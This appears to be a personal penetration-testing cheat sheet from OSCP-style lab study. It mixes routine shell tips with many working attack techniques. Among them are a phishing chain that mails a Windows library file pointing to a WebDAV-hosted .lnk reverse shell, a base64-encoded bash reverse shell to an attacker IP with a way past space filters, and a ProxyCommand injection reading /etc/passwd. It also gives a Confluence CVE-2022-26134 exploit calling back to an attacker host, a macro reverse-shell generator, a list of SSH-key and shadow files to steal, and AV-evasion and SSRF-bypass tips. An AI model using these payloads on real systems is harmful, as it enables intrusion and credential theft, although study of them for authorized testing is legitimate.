## Generic Notes

"Whether you think you can or think you can’t, you’re right."

### Technical Procedures and Commands

1. **Accessing Module Exercise VMs via SSH**:
```bash
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@191.168.50.52
```

2. **Addressing File Execution Permission Issues**:
   - If lacking execution permissions, copy the file to a location where execution is permitted.


#### Adding Repositories

Sources are stored in /etc/apt/sources.list. Let's say that a package isn't found, so you can't install new binaries or packages, you're likely missing the source location in which the binary or package is held. Modify the provided file to include the source you need.

---

#### Changing MAC Address

```bash
sudo ifconfig eth0 down
sudo ifconfig eth0 hw ether 00:00:00:11:11:11
sudo ifconfig eth0 up
```

Some additional cool tools are located in 'https://github.com/nil0x42/awesome-hacker-note-taking'.

#### Python HTTP Server

```bash
python -m SimpleHTTPServer 80
```

#### PenTestMonkey

Great tool of cheat sheets: `https://pentestmonkey.net/cheat-sheet/shells/reverse-cheat-sheet`

### Phishing with Windows Library Files

Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer.

First, we'll create a Windows library file connecting to a WebDAV share we'll set up. In the first stage, the victim receives a .Library-ms file, perhaps via email. When they double-click the file, it will appear as a regular directory in Windows Explorer. In the WebDAV directory, we'll provide a payload in the form of a .lnk shortcut file for the second stage to execute a PowerShell reverse shell. We must convince the user to double-click our .lnk payload file to execute it.

When they double-click the file, Windows Explorer displays the contents of the remote location as if it were a local directory. In this case, the remote location is a WebDAV share on our attack machine. Overall, this is a relatively straightforward process and makes it seem as if the user is double-clicking a local file.

We'll run WsgiDAV from the /home/kali/.local/bin directory. The first parameter we'll provide is --host, which specifies the host to serve from. We'll listen on all interfaces with 0.0.0.0. Next, we'll specify the listening port with --port=80 and disable authentication to our share with --auth=anonymous. Finally, we'll set the root of the directory of our WebDAV share with --root /home/kali/webdav/.

```bash
kali@kali:~$ mkdir /home/kali/webdav

kali@kali:~$ touch /home/kali/webdav/test.txt

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
Running without configuration file.
...
17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
```

You can check that it's running by going to 'http://127.0.0.1' in your browser.

```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

#### Find Files Owned by Particular User (or Group)

```bash
find / -user admin 2</dev/null
```

#### Test Ping Against Yourself

Local.
```
sudo tcpdump -i tun0 icmp -n -v
```

Remote.
```
ping -c 1 {ip address}
```

#### Test for RCE

A great way to test for remote code execution is by using 'sleep {number}', and seeing if the request time increases by that number. This can be easily tested in BurpSuite.

#### Reverse Shell (NoHup)

It's good practice to use 'nohup' when you're doing a reverse shell so that it doesn't hang. If workers={currently maxed out}, then you won't be able to create your own thread. - IppSec HTB Mentor

#### Session Cookie

Your session cookie may be JSON in base64.. decode to see how you can manipulate your status.

#### Logging In to Apps

Intercept with BurpSuite, see if you can modify headers for mass assignment, LFI, RFI, RCE.

#### Version Identified
 
Proceed to check ExploitDB and Google for any public vulnerabilities.

#### Login Screen

Google what the default credentials are for that app and try those.

#### Additional Practice 

TJ_Null's OSCP-like box list.

#### Search Known Hashes

- Go to hashes.org.

#### Crack SSH Login

- Use Medusa if you want to check a known list of potential usernames and passwords.
- Use SHCrack if you want to check a password list for a specified user.. can put into a loop for multiple users.

#### Fuzzing APIs

When fuzzing APIs, try to fuzz in special characters ("/opt/SecLists/Fuzzing/special-characters.txt") and monitor for different responses. You can do this recursively. Find out if you can close out a command so you can inject new code. Note: You have to escape special characters in FUFF:
```bash
fuff -u 123.123.123.123/weather/forecast?city=\'FUZZ-- -w /opt/SecLists/Fuzzing/special-characters.txt -mc 200,500 -fw 9
```

#### Special Characters in SQL

If you run into special characters in a database that you need to extract, convert into Base64 with a command like:
```bash
select TO_BASE64(password) from accounts where id = 1;
```

#### Path Injection

If you have sudo permissions on a file (can be found with 'sudo -l'), and the file uses a command, such as 'gzip', you can modify the environment path in order to get your own file to run as 'gzip'. Simply create a bash file called 'gzip' and insert your current working directory into the first position in the path variable.

#### Mounting SMB Shares

Instead of enumerating Windows shares with smbclient, you can mount shares on your local filesystem and enumerate in a familiar environment.
```bash
sudo mkdir /mnt/data
sudo mount -t cifs //123.123.123.123/Data /mnt/data
```

Note that Windows likes to store some files in UTF-16LE, while Linux likes UTF8. If you run into this problem, you'll need to convert in order to cat the files.

```bash
cat file | iconv -f UTF-16LE -t utf8
```

#### URL Directory Without Slash

Try searching for URL directories without the slash (e.g. 'http://website.com/upload'), and if the url is automatically updated to 'http://website.com/upload/', then there's some sort of logic going on, and the directory probably exists, even if it says "Not Found" or something along those lines.

#### IP Address Blocked

If for whatever reason (such as doing a SSRF) 127.0.0.1 & localhost (or any other IPs) are blocked, you may be able to get around this by representing the IP in hex form, '0x7f000001', in order to bypass this.

#### Version Exposed

When a version for ANYTHING is exposed or uncovered, DO NOT SKIP OVER THIS and search the web for public exploits. This will be a part of your process.

#### Unzipping Files

```bash
unzip file.zip
7z x file.zip
tar -xzvf file.tar.gz
sudo gzip -d rockyou.txt.gz
unrar x file.rar
```

#### PyInstaller

If Python is not installed on a target system, and you don't know how to write C code for the function that you want to do, you can use PyInstaller in order to turn a Python script into an executable that can be run on the target system.

#### Cross-Compiling Code

If you need to compile code for a Windows exploit, and the only machine that you have access to is your Kali machine, you can use **mingw-w64** to compile the code into a Windows Portable Executable (PE) file.
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe

# Google the error if it doesn't work, in this case, modify as follows
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

#### AntiScan.me

This service scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties.

#### Bind Shells

Be aware of this method of access, it is convenient. 

#### Crackstation.net

Instead of manual cracking with hashcat or JTR, you can put the hash into "https://crackstation.net" instead. According to S1REN (OffSec employee), it's akin to running the rockyou.txt wordlist with hashcat & JTR.

#### Note When Encoding Payload

Whenever encoding and decoding a reverse shell in base 64, remove the special characters like + and = because they often cause errors. Simply insert extra spaces where necessary. 

#### No Spaces in Payload Work-Around

You can replace the whitespaces by a variable that is a whitespace, either by creating it, or using '${IFS}'.

```bash
-o${IFS}ProxyCommand="cat /etc/passwd"${IFS}kanderson
-h;echo${IFS}-n${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDMgICAwPiYxICAg|base64${IFS}-d|bash${IFS};#
```

```bash
{echo,-n,**base64 encoded reverse bash shell**}|{base64,-d}|bash
```

This can overcome rules that don’t allow for spaces. 

#### Login Forms

When you run into login forms, think SQLi, Code injection, error-message username enumeration, search default credentials, brute-forcing with hydra/wfuzz, search web for exploits, SSTIs, custom wordlists with cewl.

#### Once Logged In

Assess the functionality provided to us and see if we can abuse it.

Look for service versions (exploit-db), abusing file-upload vulnerability, user privileges may be able to be changed, code execution directly in a new post/page, look for modules, extensions & addons or create your own with backdoors, look for a downgrade attack on the target machine/cms, edit some pre-existing extension or functionality to plant executable code, look for interesting data, credentials

#### Using Public Exploits

It's important to at least psyeudo understand the payload that you are using, if nothing else, to make sure that it works on your end. For example, CVE-2022-26134 for Confluence uses the following payload:

```bash
curl -v http://192.168.235.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.213/1271%200%3E%261%27%29.start%28%29%22%29%7D/
```

If you didn't study the payload, you wouldn't see the there are certain characters in the payload that *aren't* url endcoded. These characters are like this for a reason. You can extrapolate to many other payloads. 

#### Find and Kill Process Running on a Port

```bash
sudo lsof -i :2345
kill -9 <PID>

netstat -a -b # Not specific port
Get-Process -Id (Get-NetTCPConnection -LocalPort port).OwningProcess
```

#### Is the Computer Connected to Other Internal Computers?

When looking at the output from ifconfig, ipconfig, or ip addr, see if there is more than one network interface (other than the loopback). If there is, that is very interesting, and you should enumerate, if not, just focus on the computer itself. The target machine below is not connected to the internal network and we cannot use it as a pivot point.

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:265d/64 scope link 
       valid_lft forever preferred_lft forever
```


#### When you See Input Section on Website

Try to set up a quick python server and make a get request with HTML:

```html
 <body>                                                                         
     <a href="http://192.168.192.121:8000/your-endpoint">Send GET Request</a>         
 </body>
 ```

 #### How to tell if you're dealing with Powershell or CMD

 ```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```

#### PHPINFO - What to Look For

Look for the document root, as it will tell you the directory the website is working out of. Also, look at "disable_functions" as it will tell you what functions you're allowed to run in PHP. There may be information about a user by way of '/home' or 'C:\Users' directory

 #### Mark Yourself as the Owner of Current Directory

 This is more for ease of use, when you know that the files in this directory could be compromised without you worrying. 

```bash
sudo chown -R username:username ./
```

#### Probably the best Cheat Sheet I've Found

"https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/" 


#### Swaks

This didn't work without the '@' in front of the attachment.

```bash
sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.196.189 --body body.txt --header "Subject: Staging Script" -ap

sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

#### Verify Checksum

Download the software, then echo the copied checksum along with the filename of the installer into a file, then use the sha256sum -c command:

```bash
kali@kali:~$ cd ~/Downloads

kali@kali:~/Downloads$ echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb" > sha256sum_nessus

kali@kali:~/Downloads$ sha256sum -c sha256sum_nessus
Nessus-10.5.0-debian10_amd64.deb: OK
```

#### Background a Payload, Shell, or Process

Let's say that you're executing a reverse shell (from a reverse shell), and you don't want that shell to just hang there, simply append an '&' to the end of your command and it will background the reverse shell process:

```bash
#Linux
./binary444&
```

```bash
#Windows
Start-Process -NoNewWindow .\binary80.exe
```

#### Cracking Zip File

```bash
zip2john protected.zip > zip.hash
john -w=/usr/share/wordlists/rockyou.txt zip.hash
7z x protected.zip
```

#### Name Mash

If you have first and last names, you can use this program to create different popular formats for usernames, "https://gist.github.com/superkojiman/11076951".


#### Getting a Reverse Shell with VBA Macros

```bash
# With Minitrue

cd /opt/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
```

#### Auth through nc bind

If you bind to a port, such as Cassandra on port 8021, and you get the following,

```bash
kali@kali:~$ nc 192.168.120.155 8021
Content-Type: auth/request
...
help

Content-Type: command/reply
Reply-Text: -ERR command not found
...
```

you can authenticate by typing:

```bash
auth <default password>
```

#### Interesting Files for File Inclusion, Path Traversal

```bash
/etc/passwd
/etc/shadow
/root/.ssh/id_rsa
/root/.ssh/id_ecdsa
/root/.ssh/id_ed25519
/home/user/.ssh/id_rsa
/home/user/.ssh/id_ecdsa
/home/user/.ssh/id_ed25519
/proc/self/environ
/proc/self/cmdline
/var/www/html/index.php # Or any interesting files you didn't have access to with gobuster
/home/user/.bash_history
/root/.bash_history
/etc/ssh/sshd_config # See who's allowed to ssh into the box
```

#### Stop a Backgrounded Process

```bash
ps -eaf | grep pspy
kill 1713
# or
jobs
kill %1
# or
fg %1 # then Ctrl+C
```

#### ODT Files to Capture NTLM Hash

If you can upload ODT files to a Windows backend, consider making an ODT file that reaches out to your server that is listening for hashes. You can do this easily with 44564 on ExploitDB.

#### Remove Duplicated Words

Assuming that the words are one per line, and the file is already sorted:

```bash
uniq filename
```

If the file's not sorted:

```bash
sort filename | uniq
```

If they're not one per line, and you don't mind them being one per line:

```bash
tr -s [:space:] \\n < filename | sort | uniq
```

That doesn't remove punctuation, though, so maybe you want:

```bash
tr -s [:space:][:punct:] \\n < filename | sort | uniq
```

#### Google Search Operators

```bash
allintext:"keyword" # Searches for all keywords given.
intext:"keyword" # Searches for keywords together or separately.
inurl:"keyword" # Finds URLs with a keyword.
allinurl:"keyword" # Finds URLs with all specified keywords.
intitle:"keyword" # Finds titles with keywords.
allintitle:"keyword" # Finds titles with all specified keywords.
site:"www.google.com" # Searches within a specific site.
filetype:"pdf" # Finds files of a specified type.
link:"keyword" # Finds external links to pages.
numrange:321-325 # Finds specific numbers in searches.
filetype:pdf & (before:2020-01-01 after:2021-01-01) # Searches within a date range.
inanchor:rat # Shows sites with keyterms in inbound links.
allinpostauthor:"keyword" # Finds blog posts by specific authors.
```

#### Combine wordlists

Directory list.

```bash
cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt /usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt > /opt/SecLists/Discovery/Web-Content/temp.txt
awk '!a[$0]++' /opt/SecLists/Discovery/Web-Content/megadir.txt > /opt/SecLists/Discovery/Web-Content/megadir.txt
rm /opt/SecLists/Discovery/Web-Content/temp.txt
```

Lowercase directory list.

```bash
cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt /usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt > /opt/SecLists/Discovery/Web-Content/temp.txt
awk '{line=tolower($0)} !seen[line]++'  /opt/SecLists/Discovery/Web-Content/temp.txt > /opt/SecLists/Discovery/Web-Content/megadirlow.txt #
rm /opt/SecLists/Discovery/Web-Content/temp.txt
```

Password list.

```bash
cd /usr/share/wordlists/seclists/Passwords
for num in $(seq 2018 2024); for word in $(echo "Summer" "summer" "Winter" "winter" "Spring" "spring" "Autumn" "autumn"); do echo ${word}${num} >> /usr/share/wordlists/fasttrack.txt; done
cat /usr/share/wordlists/fasttrack.txt 500-worst-passwords.txt xato-net-10-million-passwords-100.txt probable-v2-top207.txt darkweb2017-top100.txt 2023-200_most_used_passwords.txt 2020-200_most_used_passwords.txt xato-net-10-million-passwords-1000000.txt probable-v2-top12000.txt darkweb2017-top10000.txt mssql-passwords-nansh0u-guardicore.txt darkc0de.txt bt4-password.txt /usr/share/wordlists/rockyou.txt > temp.txt
awk '!a[$0]++' temp.txt > /usr/share/wordlists/combo.txt
rm temp.txt
```

#### Unknown ports

```bash
nc -nv $ip 3003 #run this
help
version # Then use version to look for exploits
````

#### Import ADModule Active Directory

First just try..

```bash
Import-Module ActiveDirectory
```

```bash
curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  
curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  
Import-Module .\Microsoft.ActiveDirectory.Management.dll  
Import-Module .\ActiveDirectory.psd1  
```

### Penetration Testing Methodologies

1. **OWASP Penetrating Testing Execution Standard**:
   - Pre-engagement Interactions.
   - Intelligence Gathering.
   - Threat Modeling.
   - Vulnerability Analysis.
   - Exploitation.
   - Post Exploitation.
   - Reporting.

---

### Effective Note-taking and Report Writing

1. **General Guidelines**:
   - Understand the scope.
   - Document the Rules of Engagement.
   - Ensure clarity and precision.
   - Make notes easily understandable and repeatable.
   - Use cloud storage for portability.
   - Include every relevant command.
   - Discard unhelpful notes.
   - Recommended tools: Sublime, CherryTree, Obsidian.

2. **Documenting Web Application Vulnerabilities**:
   - Application Name, URL, Request Type, Issue Detail, Proof of Concept Payload.

3. **Characteristics of Good and Bad Screenshots**:
   - Good: Legible, relevant to the client, supports description, properly frames the material.
   - Bad: Illegible, generic, contains irrelevant information, poorly framed.

### Hiding & extracting a file in an image

https://github.com/tbpaolini/imgconceal/releases/tag/v1.0.4

```bash
imgconceal -i "path to cover image" -h "path to file being hidden" -p "password for extraction"

imgconceal -e "path to cover image" -p "password for extraction"
```